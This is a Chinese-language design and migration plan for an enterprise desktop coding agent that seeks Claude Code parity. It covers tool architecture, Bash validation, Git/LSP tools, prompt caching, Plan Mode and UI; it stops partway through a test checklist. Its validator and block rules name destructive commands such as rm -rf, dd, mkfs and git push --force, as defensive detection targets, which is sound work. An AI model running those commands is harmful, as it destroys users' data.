# Claude Code Parity 架构设计 × 迁移方案 × 验收规范

> **版本**: v2.0 | **日期**: 2026-04-17 | **状态**: 架构设计  
> **前置文档**: `docs/plans/claw-code-integration-plan.md` (v1.0)  
> **目标**: 迁移后 IronClaw Desktop Client 达到 Claude Code 行为级 Parity，同时保留并强化政企安全能力

---

## 目录

- [第一部分：架构设计](#第一部分架构设计)
- [第二部分：分阶段迁移方案](#第二部分分阶段迁移方案)
- [第三部分：验收规范与 Parity Harness](#第三部分验收规范与-parity-harness)

---

# 第一部分：架构设计

## 1. 设计原则

| 编号 | 原则 | 说明 |
|------|------|------|
| P1 | **原生集成，非桥接** | 所有能力在 ironclaw 引擎内原生实现，淘汰 `JobMode::ClaudeCode` 外部 CLI 桥接 |
| P2 | **安全管道不开后门** | 所有新工具必须通过 DLP → 审批 → 沙箱 → 审计 完整管道 |
| P3 | **增量替换，不断服务** | 新工具与现有工具并行运行，通过 feature flag 逐步切换 |
| P4 | **前端可消费** | 每个后端能力都必须有对应的前端 UI 组件露出 |
| P5 | **行为 Parity 优于 API Parity** | 不照搬 Claude Code 的 API 签名，而是复现其行为结果 |
| P6 | **Cache 稳定性优先** | Prompt 架构重构以 >90% cache 命中率为硬指标 |

## 2. 当前架构 vs 目标架构

### 2.1 能力差距总览

```
                  ┌──────────────────────────────┐
                  │     Claude Code 能力全集      │
                  │                              │
                  │  ┌────────────────────────┐  │
                  │  │  ironclaw 已有能力     │  │
                  │  │  (54 tools + 安全基座) │  │
                  │  │                        │  │
                  │  │  ✅ 多模型路由(16+)    │  │
                  │  │  ✅ DLP/审批/RBAC/审计  │  │
                  │  │  ✅ Docker+WASM 沙箱   │  │
                  │  │  ✅ MCP 集成(3 传输)   │  │
                  │  │  ✅ Prompt Cache(基础)  │  │
                  │  │  ✅ Context Compaction  │  │
                  │  │  ✅ 多通道(6+)        │  │
                  │  │  ✅ 记忆(FTS+向量)    │  │
                  │  └────────────────────────┘  │
                  │                              │
                  │  ❌ Grep/Glob 搜索工具       │
                  │  ❌ 精细文件编辑(edit_file)  │
                  │  ❌ Bash 多阶段语义验证       │
                  │  ❌ LSP 代码智能              │
                  │  ❌ Git 深度集成              │
                  │  ❌ 静态/动态 Prompt 分层     │
                  │  ❌ Plan Mode                 │
                  │  ❌ Session Fork              │
                  │  ❌ Explore/Verify Sub-Agent  │
                  │  ❌ Parity Harness            │
                  └──────────────────────────────┘
```

### 2.2 目标架构全景

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      IronClaw Desktop Client                            │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │                          前端 (React + Tauri)                     │  │
│  │                                                                   │  │
│  │  ┌─────────────┐ ┌──────────────┐ ┌────────────┐ ┌────────────┐ │  │
│  │  │ Chat + Code │ │ Tool Result  │ │ Plan Board │ │ Git Panel  │ │  │
│  │  │ Composer    │ │ Renderer     │ │            │ │            │ │  │
│  │  └──────┬──────┘ └──────┬───────┘ └─────┬──────┘ └─────┬──────┘ │  │
│  │         │               │               │              │         │  │
│  │  ┌──────┴───────────────┴───────────────┴──────────────┴──────┐  │  │
│  │  │              Tauri IPC Layer (invoke / listen)              │  │  │
│  │  └────────────────────────────┬───────────────────────────────┘  │  │
│  └───────────────────────────────┼──────────────────────────────────┘  │
│                                  │                                      │
│  ┌───────────────────────────────┼──────────────────────────────────┐  │
│  │                    IronClaw Engine (Rust)                         │  │
│  │                                                                   │  │
│  │  ┌─── Agent Loop ─────────────────────────────────────────────┐  │  │
│  │  │                                                             │  │  │
│  │  │  ┌──────────┐  ┌──────────────┐  ┌────────────────────┐   │  │  │
│  │  │  │ Reasoner │→│ Tool Dispatch │→│ execute_with_safety │   │  │  │
│  │  │  │          │  │              │  │                    │   │  │  │
│  │  │  │ Static   │  │ Registry     │  │ DLP → Approval →  │   │  │  │
│  │  │  │ Prompt + │  │ (builtin +   │  │ Validate → Exec → │   │  │  │
│  │  │  │ Dynamic  │  │  MCP + WASM) │  │ Audit → Sanitize  │   │  │  │
│  │  │  │ Prompt   │  │              │  │                    │   │  │  │
│  │  │  └──────────┘  └──────────────┘  └────────────────────┘   │  │  │
│  │  │                                                             │  │  │
│  │  │  ┌──── P0 新工具 ────────────┐                             │  │  │
│  │  │  │ GrepSearchTool            │                             │  │  │
│  │  │  │ GlobSearchTool            │                             │  │  │
│  │  │  │ CodeEditTool              │                             │  │  │
│  │  │  │ EnhancedReadFileTool      │                             │  │  │
│  │  │  │ BashValidationEngine      │                             │  │  │
│  │  │  └───────────────────────────┘                             │  │  │
│  │  │                                                             │  │  │
│  │  │  ┌──── P1 新工具 ────────────┐  ┌──── P2 新能力 ────────┐ │  │  │
│  │  │  │ LspQueryTool              │  │ PlanModeTool           │ │  │  │
│  │  │  │ GitStatusTool             │  │ SessionForkTool        │ │  │  │
│  │  │  │ GitDiffTool               │  │ TaskPacketTool         │ │  │  │
│  │  │  │ GitCommitTool             │  │ ExploreSubAgent        │ │  │  │
│  │  │  │ GitLogTool                │  │ VerifySubAgent         │ │  │  │
│  │  │  └───────────────────────────┘  └────────────────────────┘ │  │  │
│  │  └─────────────────────────────────────────────────────────────┘  │  │
│  │                                                                   │  │
│  │  ┌─── Prompt Architecture (重构) ──────────────────────────────┐ │  │
│  │  │                                                              │ │  │
│  │  │  ┌── 静态层 (Cacheable) ──────────────────────────┐         │ │  │
│  │  │  │ • 身份定义 + 核心规则 + 工具规范 + 安全策略     │         │ │  │
│  │  │  │ • output: 单一稳定字符串, 改动频率 < 1次/周     │         │ │  │
│  │  │  └────────────────────────────────────────────────┘         │ │  │
│  │  │           ↓  __PROMPT_CACHE_BOUNDARY__                      │ │  │
│  │  │  ┌── 动态层 (Per-session) ────────────────────────┐         │ │  │
│  │  │  │ • 环境信息(OS/CWD/Git) + CLAUDE.md/记忆        │         │ │  │
│  │  │  │ • 激活的 Skills + MCP 指令 + Token 预算         │         │ │  │
│  │  │  │ • Admin 下发策略 + 部门级规则                    │         │ │  │
│  │  │  └────────────────────────────────────────────────┘         │ │  │
│  │  └──────────────────────────────────────────────────────────────┘ │  │
│  │                                                                   │  │
│  │  ┌─── 安全基座 (现有 + 强化) ─────────────────────────────────┐ │  │
│  │  │ ironclaw_safety • DLP Engine • RBAC • Approval Flow       │ │  │
│  │  │ Docker Sandbox • WASM Sandbox • Credential Manager         │ │  │
│  │  │ Network Proxy • Audit Logger • Policy Enforcement          │ │  │
│  │  │ ──── 新增强化 ────                                         │ │  │
│  │  │ FileOperationGuard (symlink+binary+boundary)               │ │  │
│  │  │ BashSemanticValidator (5-stage pipeline)                   │ │  │
│  │  │ LSP Connection Policy (admin-controlled whitelist)         │ │  │
│  │  │ Git Operation Policy (repo whitelist + commit approval)    │ │  │
│  │  └───────────────────────────────────────────────────────────┘ │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌─── Admin Backend (管控增强) ──────────────────────────────────────┐  │
│  │ • 代码工具启用/禁用策略    • 工作区路径白名单                      │  │
│  │ • LSP 服务器白名单          • Git 仓库白名单                       │  │
│  │ • Bash 自定义规则           • 代码操作审计报表                     │  │
│  └───────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

## 3. 核心子系统设计

### 3.1 文件操作子系统 — FileOperationGuard

**设计动机**: ironclaw 现有 `path_utils::validate_path` 做了路径归一化和沙箱校验，但缺少 claw-code 的二进制检测、符号链接逃逸检测和精细大小限制。不是替换，而是**增强现有路径验证层**。

```
                        用户/LLM 请求文件操作
                                │ 
                                ▼
                  ┌──────────────────────────────┐
                  │  path_utils::validate_path   │ ← 现有：归一化 + 沙箱边界
                  └──────────────┬───────────────┘
                                 ▼
                  ┌──────────────────────────────┐
                  │  FileOperationGuard (新增)    │
                  │  ├─ is_symlink_escape()       │ ← 递归解析 resolve 后是否仍在边界内
                  │  ├─ is_binary_file()          │ ← 前 8KB NUL 扫描
                  │  ├─ check_size_limit()        │ ← 读 10MB / 写 10MB (可配置)
                  │  └─ normalize_line_endings()  │ ← CR/LF 统一
                  └──────────────┬───────────────┘
                                 ▼
                        实际 I/O 操作
```

**新增工具定义**:

| 工具名 | 功能 | 替代/增强 |
|--------|------|-----------|
| `GrepSearchTool` | 正则搜索 + 上下文行 (-B/-A/-C) + 结果分页 | 新增（ironclaw 无对应工具） |
| `GlobSearchTool` | 文件模式匹配 + 排除模式 + 深度限制 | 新增（ironclaw 无对应工具） |
| `CodeEditTool` | 搜索/替换字符串编辑 + 多处同时替换 + diff 预览 | 增强现有 `ApplyPatchTool`（保留旧工具兼容） |
| `EnhancedReadFile` | 行号偏移 + limit + 二进制检测 + 编码检测 | 增强现有 `ReadFileTool`（原地升级） |

**关键实现约束**:
- `GrepSearchTool` 在有 `ripgrep` 时委托 `rg`，无 `rg` 时回退纯 Rust `grep-regex` crate
- `GlobSearchTool` 使用 `globset` crate，尊重 `.gitignore` 规则
- 所有工具经过 `FileOperationGuard` → `path_utils::validate_path` 双层校验
- 输出经过 `ironclaw_safety` 截断 + 敏感信息检测

### 3.2 Bash 验证引擎 — BashSemanticValidator

**设计动机**: ironclaw 现有 ShellTool 有命令黑名单和注入检测，但缺少 claw-code 的**语义级分析**。目标是**叠加第二层验证**，而非替换。

```
Shell 命令请求
    │
    ▼
┌────────────────────────────────────────────────────────────┐
│ Layer 1: ironclaw ShellTool 现有安全 (保留)                │
│ ├─ BLOCKED_COMMANDS 黑名单                                 │
│ ├─ DANGEROUS_PATTERNS 检测                                 │
│ ├─ injection/obfuscation 检测                              │
│ └─ SAFE_ENV_VARS 白名单                                    │
└───────────────────────┬────────────────────────────────────┘
                        ▼
┌────────────────────────────────────────────────────────────┐
│ Layer 2: BashSemanticValidator (新增,从 claw-code 移植)     │
│                                                            │
│ Stage 1: readOnlyValidation                                │
│   └─ 命令是否只读？→ 降级 RiskLevel 为 Low                │
│                                                            │
│ Stage 2: destructiveCommandWarning                         │
│   └─ rm -rf, dd, format, mkfs 等 → 强制 RiskLevel::High   │
│                                                            │
│ Stage 3: pathValidation                                    │
│   └─ 命令中的路径参数合法性                                │
│                                                            │
│ Stage 4: commandSemantics                                  │
│   └─ CommandIntent 分类:                                   │
│      ReadOnly | Write | Destructive | Network              │
│      | ProcessManagement | PackageManagement | SystemAdmin  │
│                                                            │
│ Stage 5: sedValidation                                     │
│   └─ sed -i / awk 覆盖模式特殊处理                         │
└───────────────────────┬────────────────────────────────────┘
                        ▼
              安全决策 → RiskLevel + 是否需要审批
```

**CommandIntent 与 ironclaw RiskLevel 映射**:

| CommandIntent | ironclaw RiskLevel | 审批 | 沙箱 |
|---------------|-------------------|------|------|
| ReadOnly | Low | Never | 可选 |
| Write | Medium | UnlessAutoApproved | 推荐 |
| Destructive | High | Always | 强制 |
| Network | Medium | UnlessAutoApproved | 强制 |
| ProcessManagement | High | Always | 强制 |
| PackageManagement | High | Always | 强制 |
| SystemAdmin | High | Always | 强制 |

### 3.3 LSP 集成子系统

**设计**: 复用 claw-code 的 `LspAction` 枚举和注册表模式，但通过 ironclaw 工具系统暴露（而非独立暴露 LSP 协议）。

```
LspQueryTool
    │
    ├─ action: Diagnostics | Hover | Definition | References | Symbols | Format
    ├─ file_path: String
    ├─ position: Option<(line, col)>
    │
    ▼
┌────────────────────────────────┐
│ LspRegistry (全局单例)         │
│ ├─ Arc<Mutex<HashMap<Lang>>>   │
│ ├─ register(lang, cmd, args)   │
│ ├─ find_server_for_path(path)  │
│ └─ auto_start_on_demand()      │
│                                │
│ 语言 → 服务器映射:             │
│ .rs  → rust-analyzer           │
│ .ts  → typescript-language-    │
│        server                  │
│ .py  → pyright/pylsp           │
│ .go  → gopls                   │
│ .java → jdtls                  │
└──────────────┬─────────────────┘
               ▼
        LSP JSON-RPC 通信
        (stdio transport)
```

**安全约束**:
- LSP 服务器列表由 Admin Backend 下发白名单控制
- 仅 ReadOnly 权限级别，不需审批
- LSP 进程由 ironclaw 管理生命周期，不暴露给 LLM
- 诊断/引用/定义信息经过 `ironclaw_safety` 敏感信息过滤

### 3.4 Git 集成子系统

**工具拆分**: 将 Git 操作按 **风险等级** 拆分为独立工具，而非单一 `git` 工具。

| 工具名 | 操作 | 风险 | 审批 |
|--------|------|------|------|
| `GitStatusTool` | status, log, branch -l, remote -v | Low | Never |
| `GitDiffTool` | diff, diff --staged, show | Low | Never |
| `GitCommitTool` | add, commit, tag | Medium | UnlessAutoApproved |
| `GitBranchTool` | checkout, branch -d, switch | Medium | UnlessAutoApproved |
| `GitPushTool` | push, pull, fetch | High | Always |
| `GitStaleCheckTool` | merge-base, rev-list (检测过期分支) | Low | Never |

**特别设计**:
- `GitCommitTool` 的 commit message 经过 DLP 扫描
- `GitPushTool` 始终需要用户确认，且 push --force 被 BLOCKED_COMMANDS 拦截
- `GitStaleCheckTool` 在 Agent 开始编码任务前自动执行，提示用户 rebase
- 所有 Git 输出经过敏感信息过滤（隐藏 remote URL 中的 token）

### 3.5 Prompt 架构重构 — 静态/动态分层

**当前问题**: ironclaw 的 `build_system_prompt_with_tools()` 每次调用重建整个 system prompt，导致 Anthropic prompt cache 命中率不稳定。

**目标**: 达到 Claude Code 的 92% cache 命中率。

**实现方案**:

```rust
/// 重构后的 Prompt 构建器
pub struct LayeredPromptBuilder {
    /// 静态层 — 仅在配置变更/启动时重建
    /// 包含: 身份 + 核心规则 + 工具规范 + 安全策略
    static_layer: Arc<String>,
    
    /// 静态层 hash — 用于检测配置变更
    static_hash: u64,
    
    /// 动态层 — 每次 LLM 调用时重建
    /// 包含: 环境信息 + 记忆 + Skills + MCP + Token 预算
    dynamic_layer_builder: DynamicLayerBuilder,
}

impl LayeredPromptBuilder {
    /// 构建完整 system prompt
    /// 静态层 + cache boundary marker + 动态层
    fn build(&self, session: &Session) -> Vec<SystemPromptBlock> {
        vec![
            SystemPromptBlock {
                content: self.static_layer.clone(),
                cache_control: Some(CacheRetention::Long), // 1h
            },
            // ← Anthropic 会在这里切分 cache prefix
            SystemPromptBlock {
                content: self.dynamic_layer_builder.build(session),
                cache_control: None, // 不缓存
            },
        ]
    }
}
```

**静态层内容（按 Claude Code 分析对齐）**:

| 段落 | 内容 | 变更频率 |
|------|------|---------|
| 身份定义 | "你是 IronClaw，一个企业级 AI 编程办公助手..." | < 1次/月 |
| 核心规则 | 编码规范、最小复杂度、操作谨慎原则 | < 1次/周 |
| 工具规范 | 所有工具的 system prompt 级描述和使用指南 | 工具变更时 |
| 安全策略 | DLP 行为说明、审批流程说明、沙箱限制说明 | < 1次/月 |
| 语气与格式 | 输出风格、Markdown 规范、简洁性要求 | < 1次/月 |

**动态层内容（每次调用）**:

| 段落 | 内容 | 来源 |
|------|------|------|
| 环境信息 | OS/CWD/Git branch/Node version/Rust version | 运行时检测 |
| 项目记忆 | CLAUDE.md / .ironclaw/memory/ 内容 | 文件系统 |
| 激活 Skills | 当前会话激活的 Skill 指令 | Skill Selector |
| MCP 指令 | 已连接 MCP 服务器的动态指令 | MCP 会话 |
| Admin 策略 | 管理后台下发的运行时策略 | Policy Sync |
| Token 预算 | 剩余 token 限制提示 | Quota Service |
| 语言偏好 | 用户交互语言 | 用户设置 |

### 3.6 Plan Mode 与 Session Fork

**Plan Mode** 是 Claude Code 的核心交互模式之一，允许 Agent 在**规划阶段**只分析不执行，确认后再进入**执行阶段**。

**实现**: 扩展 ironclaw 的 `ThreadState` 枚举。

```
现有 ThreadState:
  Idle → InProgress → Waiting → Done → Error

扩展后:
  Idle → Planning → InProgress → Waiting → Done → Error
              ↑          │
              └──────────┘  (用户要求重新规划)
```

**Planning 状态下的行为变化**:
- LLM 可以调用 ReadOnly 工具（读文件、grep、git status）
- 写入工具返回 **dry-run 预览** 而非实际执行
- Shell 工具只执行只读命令
- Agent 输出结构化 Plan（步骤列表 + 预期影响）
- 用户确认后切换到 InProgress，Plan 作为上下文注入

**Session Fork**: 从当前对话的任意 Turn 创建分支。

```
Thread A: T1 → T2 → T3 → T4
                      │
                      └──→ Thread A-fork-1: T3 → T3'→ T4'
```

**实现**: 利用 ironclaw 现有 `UndoManager` 的 checkpoint 机制，fork = 创建新 Thread + 复制至 checkpoint 点的消息历史。

### 3.7 Sub-Agent 架构 — Explore 与 Verify

**当前状态**: ironclaw 已有 `CreateJobTool` 支持 in-process worker job，但缺少 Claude Code 的 `AgentTool` 模式（轻量子 Agent，共享部分上下文，只返回摘要）。

**设计**: 引入 `SubAgentTool`，复用 Job 基础设施，但行为更贴近 Claude Code 的 AgentTool。

```
                    主 Agent (depth=0)
                    │
         ┌──────────┼──────────┐
         ▼                     ▼
    Explore Sub-Agent     Verify Sub-Agent
    (depth=1, ReadOnly)   (depth=1, ReadOnly + Shell)
    │                     │
    │ 工具白名单:          │ 工具白名单:
    │ - ReadFile           │ - ReadFile
    │ - GrepSearch         │ - GrepSearch
    │ - GlobSearch         │ - GlobSearch
    │ - ListDir            │ - Shell (只读命令)
    │ - LspQuery           │ - LspQuery
    │                     │ - GitDiff
    │                     │
    └─── 返回摘要 ────────┴─── 返回摘要 ──→ 主 Agent
```

**与 Claude Code AgentTool 的关键区别**:
- ironclaw Sub-Agent 同样经过 DLP + 审批 + 审计管道
- depth 限制为 1（子 Agent 不能再创建子 Agent）
- 子 Agent 可调用的工具由 Admin 策略白名单控制
- 子 Agent 结果摘要经过 `ironclaw_safety` 过滤后才注入主对话

## 4. 前端 UI 架构设计

### 4.1 当前 UI 组件结构

```
src-ui/src/app/components/
├── tabs/
│   ├── ChatTabTauri.tsx      ← 主聊天界面
│   ├── LogsTab.tsx           ← 日志
│   ├── RoutinesTab.tsx       ← 自动化任务
│   ├── ExtensionsTab.tsx     ← 扩展管理
│   ├── SkillsTab.tsx         ← 技能管理
│   ├── MemoryTab.tsx         ← 记忆系统
│   ├── JobsTab.tsx           ← 任务管理
│   └── AboutTab.tsx          ← 关于
├── assistant-ui/
│   ├── thread.tsx            ← 消息列表 (assistant-ui)
│   ├── tool-fallback.tsx     ← 工具结果渲染
│   ├── markdown-text.tsx     ← Markdown 渲染
│   └── attachment.tsx        ← 文件附件
└── main/
    ├── MainApp.tsx           ← 布局 + Tab 路由
    ├── AppSidebar.tsx        ← 导航侧边栏
    └── NotificationsPanel.tsx← 通知面板
```

### 4.2 新增/增强 UI 组件

#### 4.2.1 工具结果增强渲染 — `EnhancedToolRenderer`

当前 `tool-fallback.tsx` 对所有工具使用统一的 collapsible 折叠块。迁移后需要为代码操作提供更丰富的渲染：

```
新增组件:
src-ui/src/app/components/assistant-ui/
├── tool-renderers/
│   ├── FileReadRenderer.tsx     ← 语法高亮 + 行号 + 搜索
│   ├── FileEditRenderer.tsx     ← inline diff 视图 (before/after)
│   ├── GrepResultRenderer.tsx   ← 搜索结果 + 文件跳转
│   ├── GlobResultRenderer.tsx   ← 文件树视图
│   ├── ShellOutputRenderer.tsx  ← 终端风格输出 + exit code 指示
│   ├── GitDiffRenderer.tsx      ← unified/split diff 视图
│   ├── LspResultRenderer.tsx    ← 定义/引用列表 + 代码预览
│   └── PlanRenderer.tsx         ← Plan 步骤卡片 + 确认按钮
└── tool-result-router.tsx       ← 根据 tool_name 分发到对应 renderer
```

**FileEditRenderer** 关键设计:
- 显示修改前后的 inline diff（类似 GitHub PR review）
- 标记添加行（绿色）和删除行（红色）
- Collapsible，默认折叠，点击展开查看完整 diff
- 包含 "Undo" 按钮（调用 ironclaw UndoManager）

**ShellOutputRenderer** 关键设计:
- 黑底绿字终端风格
- Exit code 0 显示绿色圆点, 非 0 显示红色
- 长输出自动折叠，显示前 20 行 + "Show more"
- stderr 用红色字体区分

**PlanRenderer** 关键设计:
- Plan Mode 激活时，Agent 输出的步骤列表以卡片形式展示
- 每步显示: 步骤编号 + 描述 + 涉及文件 + 风险评估
- 底部 "Approve & Execute" / "Revise Plan" 按钮
- 执行阶段，每步完成后显示 ✅ 或 ❌

#### 4.2.2 Workspace 面板 — `WorkspacePanel`

在侧边栏新增 "Workspace" 导航项，替代当前只有 chat 的模式。

```
新增组件:
src-ui/src/app/components/tabs/
├── WorkspaceTab.tsx         ← 工作区总览
│   ├── FileTreeView.tsx     ← 文件树（glob 驱动，不是全量扫描）
│   ├── GitStatusBar.tsx     ← 分支 + modified files + stale 警告
│   ├── DiagnosticsBar.tsx   ← LSP 诊断摘要 (errors/warnings 计数)
│   └── ActiveToolsBar.tsx   ← 当前活跃的 MCP/LSP 连接状态
```

**设计约束**:
- 文件树**不主动扫描整个磁盘**，仅在用户点击展开时按需加载（通过 `ListDirTool`）
- Git 状态栏定期刷新（30s 间隔），通过 Tauri event push
- 诊断信息由 LSP 服务器推送，通过 Tauri event 更新

#### 4.2.3 Plan Mode UI — 主聊天集成

Plan Mode 不需要独立页面，而是**在聊天界面内切换状态**：

```
Chat Composer 区域:
┌─────────────────────────────────────────────────────┐
│ [Planning Mode]  ← 状态指示器 (蓝色 badge)          │
│                                                     │
│ ┌─────────────────────────────────────────────────┐ │
│ │ 输入消息...                          [📎] [↑]  │ │
│ └─────────────────────────────────────────────────┘ │
│                                                     │
│ [🔄 Switch to Execute]  [Model: Claude Opus 4.6]   │
└─────────────────────────────────────────────────────┘

当 Agent 输出 Plan:
┌─────────────────────────────────────────────────────┐
│ 📋 执行计划                                         │
│                                                     │
│ Step 1: 读取 src/main.rs 了解入口         [Low] ✅  │
│ Step 2: 修改 handler 函数签名          [Medium] ⏳  │
│ Step 3: 更新单元测试                   [Medium] ⏳  │
│ Step 4: 运行 cargo test 验证              [Low] ⏳  │
│                                                     │
│ 预计影响: 2 files modified, 1 test updated          │
│                                                     │
│ [✅ Approve & Execute]  [✏️ Revise Plan]            │
└─────────────────────────────────────────────────────┘
```

#### 4.2.4 Approval 增强 — 工具调用审批

当前 Approval UI 只有简单的 approve/deny。需要增强为**显示工具调用的完整上下文**：

```
审批弹窗 (增强后):
┌─────────────────────────────────────────────────────┐
│ ⚠️ 需要审批                                         │
│                                                     │
│ 工具: ShellTool                                     │
│ 命令: rm -rf dist/ && npm run build                 │
│                                                     │
│ 安全分析:                                           │
│ ├─ 命令意图: Destructive + Write                    │
│ ├─ 风险等级: High                                   │
│ ├─ 影响范围: dist/ 目录 (378 files)                 │
│ └─ 沙箱: Docker 隔离执行                            │
│                                                     │
│ [✅ Approve]  [❌ Deny]  [📝 Modify & Approve]      │
└─────────────────────────────────────────────────────┘
```

**Modify & Approve**: 用户可以修改命令后再批准（如删掉 `rm -rf` 部分）。

### 4.3 Tauri IPC 新增命令

```typescript
// 新增 IPC 命令清单 (前端 tauri.ts 需要对应添加)

// === P0: 文件操作 ===
ic_grep_search({ pattern, path, context_lines, max_results })
ic_glob_search({ pattern, path, exclude, max_depth })

// === P1: LSP ===
ic_lsp_diagnostics({ file_path })
ic_lsp_definition({ file_path, line, col })
ic_lsp_references({ file_path, line, col })
ic_lsp_hover({ file_path, line, col })
ic_lsp_symbols({ file_path })

// === P1: Git ===
ic_git_status()
ic_git_diff({ staged, file_path })
ic_git_log({ limit, file_path })
ic_git_stale_check()

// === P2: Plan Mode ===
ic_toggle_plan_mode({ thread_id })
ic_approve_plan({ thread_id, plan_id })
ic_revise_plan({ thread_id, plan_id, feedback })

// === P2: Session Fork ===
ic_fork_thread({ thread_id, at_turn })

// === 管理 ===
ic_get_workspace_info()           // FileTree + Git + LSP 状态
ic_get_code_tools_policy()        // Admin 下发的代码工具策略
```

### 4.4 前端组件与后端能力映射表

| 前端组件 | Tauri IPC | ironclaw 工具 | 用户场景 |
|---------|-----------|--------------|---------|
| FileEditRenderer | 自动（Agent 调用） | CodeEditTool | 看到 AI 做的代码修改 |
| GrepResultRenderer | ic_grep_search (手动) + Agent 调用 | GrepSearchTool | 搜索代码 |
| ShellOutputRenderer | 自动（Agent 调用） | ShellTool + BashSemanticValidator | 看到命令执行结果 |
| GitStatusBar | ic_git_status | GitStatusTool | 了解工作区 Git 状态 |
| GitDiffRenderer | ic_git_diff | GitDiffTool | 查看代码变更 |
| DiagnosticsBar | ic_lsp_diagnostics | LspQueryTool | 查看编译错误 |
| PlanRenderer | ic_approve_plan | PlanModeTool | 审查和批准 AI 计划 |
| WorkspaceTab | ic_get_workspace_info | 组合多个工具 | 项目总览 |
| Approval Dialog (增强) | ic_submit_approval_ticket | Approval Flow | 审批工具调用 |

## 5. Admin Backend 管控增强

### 5.1 新增 API 端点

| 端点 | 方法 | 功能 | 迁移阶段 |
|------|------|------|---------|
| `/api/settings/code-tools` | GET/PUT | 代码工具启用/禁用策略（按部门） | P0 |
| `/api/settings/workspace-paths` | GET/PUT | 工作区路径白名单 | P0 |
| `/api/settings/bash-rules` | GET/PUT | 自定义 Bash 命令规则 | P0 |
| `/api/settings/lsp-servers` | GET/PUT | LSP 服务器白名单 | P1 |
| `/api/settings/git-repos` | GET/PUT | Git 仓库白名单 | P1 |
| `/api/reports/code-operations` | GET | 代码操作审计报表 | P1 |

### 5.2 策略推送机制

Admin Backend 的代码工具策略通过已有的 Managed Policy 机制推送到 Desktop Client：

```
Admin Backend                          Desktop Client
     │                                      │
     │ PUT /api/settings/code-tools         │
     ▼                                      │
┌──────────┐                                │
│ 写入 DB  │                                │
│ 签名策略 │─── GET /api/client-policy ────→│
└──────────┘   (既有 Managed Policy 链路)   │
                                            ▼
                                  ┌──────────────────┐
                                  │ Policy Enforcer   │
                                  │ 启用/禁用对应工具 │
                                  └──────────────────┘
```

---

# 第二部分：分阶段迁移方案

## 阶段总览

```
P0 (2 周)          P1 (4 周)          P2 (4 周)          P3 (2 周)
─────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────
 文件操作 │  │ LSP 集成    │  │ Plan Mode   │  │ Parity
 Grep/Glob│  │ Git 集成    │  │ Session Fork│  │ Harness
 Bash 验证│  │ Prompt 分层 │  │ Sub-Agent   │  │ 回归防护
 安全强化 │  │ Admin 管控  │  │ 前端增强    │  │ 持续监控
──────────┘  └─────────────┘  └─────────────┘  └─────────────
```

## P0 阶段：核心文件操作 + Bash 验证（2 周）

### P0 前置：基础设施补齐（Day 0-1）

> **审计发现两个基础设施缺口，必须在 P0 工具开发之前补齐。**

#### P0-Pre-1: Feature Flag 最小机制

**问题**: 项目中不存在 feature flag 系统。附录 D 定义了 9 个 flag，P3 原则"增量替换，不断服务"依赖它。

**方案**: **执行时拦截**（最安全的单一拦截点）

```rust
// ironclaw/src/tools/feature_flags.rs (新建)

/// 工具级 feature flag 配置。
/// 从 Config.feature_flags 加载，支持 Admin Backend 动态推送。
pub struct ToolFeatureFlags {
    disabled_tools: HashSet<String>,
}

impl ToolFeatureFlags {
    /// 检查工具是否被 feature flag 禁用。
    /// 默认全部启用 — 只有在 disabled_tools 中的才拒绝。
    pub fn is_tool_enabled(&self, tool_name: &str) -> bool {
        !self.disabled_tools.contains(tool_name)
    }
}
```

**拦截点**: `execute_tool_with_safety()` 中 `tools.get(tool_name)` 之后、参数验证之前：

```rust
// execute.rs — 插入位置
let tool = tools.get(tool_name).await.ok_or_else(|| ...)?;

// Feature flag gate
if !job_ctx.feature_flags().is_tool_enabled(tool_name) {
    return Err(ToolError::Disabled { name: tool_name.to_string() }.into());
}

let normalized_params = prepare_tool_params(tool.as_ref(), &params);
```

**同时在 LLM 工具定义输出层过滤**（`tool_definitions()` / `tool_definitions_for_domain()`），确保禁用的工具不出现在 LLM prompt 中。

**存储**: 复用 `Config` 体系 — `Config` 新增 `feature_flags: FeatureFlagsConfig`，初始值从 env / TOML / DB 加载。Admin Backend 通过现有 `system_settings` KV 表推送变更。

**验收**: `cargo test` 含正常路径 + 禁用工具调用被拒绝 + LLM 定义不包含被禁用工具。

#### P0-Pre-2: 前端 Tool UI 注册探路

**问题**: `@assistant-ui/react` 的 `makeAssistantToolUI` API 在项目中**从未使用**。`thread.tsx` 的 `part.toolUI ?? <ToolFallback />` 路径从未被激活。P0 需要 3 个专用 Renderer，必须先验证此路径。

**方案**: 用 EchoTool 做最小技术 spike

```tsx
// src-ui/src/app/components/assistant-ui/tool-renderers/echo-renderer.tsx
// 最小验证：为 echo 工具注册自定义渲染器，确认 part.toolUI 被正确填充

import { makeAssistantToolUI } from "@assistant-ui/react";

export const EchoToolUI = makeAssistantToolUI<{ message: string }>({
  toolName: "echo",
  render: ({ args, result, status }) => (
    <div className="rounded-md border p-2 text-sm">
      <span className="font-medium">Echo:</span> {args?.message}
      {status === "complete" && result && (
        <div className="mt-1 text-muted-foreground">{String(result)}</div>
      )}
    </div>
  ),
});
```

**验收**: echo 工具调用在前端通过自定义渲染器而非 ToolFallback 显示 → 确认后批量实现 P0 的 3 个 Renderer。

**如果 `makeAssistantToolUI` API 不可用**: 回退到在 `thread.tsx` 的 `part.type === "tool-call"` 分支中按 `toolName` 手动路由（`switch(part.toolCallId)` 模式），不依赖 assistant-ui 的 toolUI 机制。

### Week 1: 安全基础层 + 搜索工具

**Day 1-2: FileOperationGuard**

```
ironclaw/src/tools/builtin/file_guard.rs (新建)
├─ is_symlink_escape(path, workspace_root) → Result<()>
├─ is_binary_file(content: &[u8]) → bool
├─ check_size_limit(path, max_bytes) → Result<()>
└─ normalize_line_endings(content) → String
```

测试清单（TDD）:
- [x] 正常路径通过
- [x] symlink 指向工作区外 → 拒绝
- [x] symlink 指向工作区内 → 通过
- [x] 包含 NUL 字节的文件 → 标记为 binary
- [x] 超过 10MB 的文件 → 拒绝
- [x] 不存在的文件 → 合适的错误消息

**Day 3-4: GrepSearchTool**

```
ironclaw/src/tools/builtin/grep_search.rs (新建)
├─ 参数: pattern, path, context_before, context_after, max_results
├─ 实现: ripgrep (Feature-gated) → 回退 grep-regex
├─ 输出: Vec<GrepMatch { file, line_number, content, context }>
└─ 安全: FileOperationGuard + ironclaw_safety 截断
```

测试清单:
- [x] 简单模式匹配
- [x] 正则表达式
